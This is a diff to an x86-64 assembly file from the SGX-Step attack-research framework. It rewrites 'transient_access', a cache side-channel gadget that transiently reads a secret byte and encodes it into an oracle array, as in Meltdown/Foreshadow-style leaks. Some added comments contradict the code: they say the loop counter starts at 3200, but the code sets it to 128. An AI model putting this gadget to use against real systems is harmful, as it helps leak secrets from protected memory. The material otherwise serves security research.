@@ -18,28 +18,30 @@
  *  along with SGX-Step. If not, see <http://www.gnu.org/licenses/>.
  */
 
-	.text
-	.global transient_access
+    .text
+    .global transient_access
     # %rdi: oracle
     # %rsi: secret_ptr
     # %rdx: slot_size
-    # %rcx: loop
-
-    mov $3300, %rcx
-my_loop: 
-    dec %rcx
-    jnz my_loop
-
 transient_access:
 
     mov $0, %rax
-    tzcnt  %rdx, %rcx             # slot_size <- log2( slot_size )
+    tzcnt %rdx, %rcx             # slot_size <- log2(slot_size)
 
     #prefetcht0 (%rsi)
 
+    mov $128, %r8              # Initialize loop counter to 3200
+
+loop_start:
+    dec %r8                      # Decrement loop counter
+    js retry                     # Jump to retry if the sign flag is set (loop counter < 0)
+
+    movb (%rsi), %al             # Load a byte from the memory address pointed to by %rsi into %al
+    shl %cl, %rax                # Shift left %rax by %cl bits (multiplied by log2(slot_size))
+    jz loop_start                # If result is zero, repeat the loop
+    movq (%rdi, %rax), %rdi      # Load 8 bytes from memory address (%rdi + %rax) into %rdi
+    retq                         # Return from the function
+
 retry:
-    movb (%rsi), %al
-    shl %cl, %rax
-    jz retry
-    movq (%rdi, %rax), %rdi
-    retq
+    mov $128, %r8              # Reinitialize loop counter to 3200 before retrying
+    jmp loop_start               # Jump back to loop_start
